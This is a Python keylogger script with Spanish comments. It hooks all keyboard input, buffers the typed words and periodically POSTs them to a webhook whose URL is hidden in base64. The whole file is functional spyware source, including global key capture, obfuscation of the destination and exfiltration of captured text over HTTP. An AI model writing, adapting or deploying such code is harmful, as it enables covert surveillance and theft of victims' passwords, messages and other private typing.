import keyboard
import requests
import base64
word = ""
space_count = 0
buffer = []
SAVE_EVERY = 10

# Webhook en base64
WEBHOOK_BASE64 = "UVhGMWFTQmtaV0psSUdseUlIUjFJSGRsWW1odmIyc2dZM0poWTJzc0lIQmxibk5oWW1GeklIRjFaU0JzYnlCcFltRWdZU0J3YjI1bGNqOC9QeUI0UkVSRVJFUkVSRVF1SUZsdklITmxJSEYxWlNCd2RXVmtaWE1nYkc5bmNtRnliRzh1SUVGMGRDQkNUMVJy"

def get_webhook():
    return base64.b64decode(WEBHOOK_BASE64).decode()

def save_word_when_press_space():
    global word, buffer, space_count
    buffer.append(word)
    print(f"Palabra registrada: {word}")
    reset_word()
    space_count += 1

    if space_count >= SAVE_EVERY:
        send_buffered_words()

def send_buffered_words():
    global buffer, space_count
    if buffer:
        text = " ".join(buffer)
        try:
            webhook_url = get_webhook()
            requests.post(webhook_url, json={"content": f"El Topo ha encontrado algo:\n{text}"})
        except Exception as e:
            print("Error enviando al webhook:", e)
        print(f"Enviado: {text}")
        buffer.clear()
    space_count = 0

def reset_word():
    global word
    word = ""

def press_key(pulsation):
    global word
    if pulsation.event_type == keyboard.KEY_DOWN:
        if pulsation.name == 'space':
            save_word_when_press_space()
        elif len(pulsation.name) == 1 and pulsation.name.isprintable():
            word += pulsation.name

keyboard.hook(press_key)

try:
    keyboard.wait("esc")
except KeyboardInterrupt:
    print("Script detenido")
finally:
    send_buffered_words()